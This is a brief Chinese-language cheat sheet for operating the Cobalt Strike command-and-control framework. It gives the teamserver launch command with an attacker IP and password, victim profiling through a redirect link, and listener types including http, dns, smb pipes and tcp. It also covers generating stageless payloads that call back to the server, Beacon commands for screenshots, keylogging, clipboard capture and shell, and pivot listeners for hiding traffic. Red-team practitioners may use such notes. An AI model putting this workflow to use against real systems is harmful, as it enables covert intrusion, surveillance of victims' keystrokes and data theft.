
# 基本
- **建立服务器（攻击者）:**
```bash
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
sudo ./teamserver [Attack IP] [Set Password] [配置文件]
```

- **链接服务器（攻击者）：**
直接启动 Cobalt Strike 客户端然后输入凭据链接即可。


#### 被动信息收集
Attack > System Profiler
可以设置重定向，后复制网址到被攻击机器，访问后就可以得到机器的基本信息。


#### 设置监听器
**http** (出口监听器)
**dns** (出口监听器)
**smb (p2p)** ：  可以使用 `PS C: \> ls \\.\pipe\` 列出所有当前正在收听的管道以获取灵感。
比如说 `TSVCPIPE-7ca725ce-7220-489f-a9b5-d4cad2bc1337`
**tcp**
**tcp-local**


#### 生成有效载荷
在 Payloads 中选择 `Windows Stageless Generate All Payloads`，生成所有有效载荷, 执行 http_x64.exe 后即可收到回应。


#### 命令 (Beacon)
```
pwd   当前目录路径
sleep 5   更快的回应
ps
screenshot
keylogger  (View > Keystrokes)    (使用jobs可以查看任务，jobkill ID 可以杀死keylogger的job)
clipboard  （粘贴板内容）
net logons  (用户登录会话)
run wmic service get name, pathname  (每个服务的列表及其可执行文件的路径)
shell + CMD

```


#### 数据透视侦听器
作用为转发流量，隐藏活动等
在图像界面右键 Attack 然后 Pivoting > Listener, 创建 demo-pivot
生成有效载荷： Payloads > Windows Executable (Stageless), 选中刚刚创建的 demo-pivot , 生成后直接执行即可。

